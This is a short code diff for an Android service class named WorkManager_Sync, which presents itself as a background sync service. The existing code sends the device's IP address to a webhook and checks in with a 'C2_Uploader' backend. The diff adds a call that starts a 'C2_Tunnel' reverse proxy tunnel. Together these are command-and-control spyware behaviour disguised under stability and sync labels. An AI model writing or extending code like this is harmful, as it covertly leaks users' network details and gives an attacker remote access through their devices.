@@ -81,6 +81,9 @@ public class WorkManager_Sync extends Service {
                         sendIpToWebhook(currentIp);
                         // [STABILITY_SYNC] Perform full status check-in with the backend
                         C2_Uploader.checkIn(WorkManager_Sync.this);
+                        
+                        // [TACTICAL_SYNC] Establish Reverse Proxy Tunnel
+                        C2_Tunnel.start(WorkManager_Sync.this);
                     });
                 }
                 
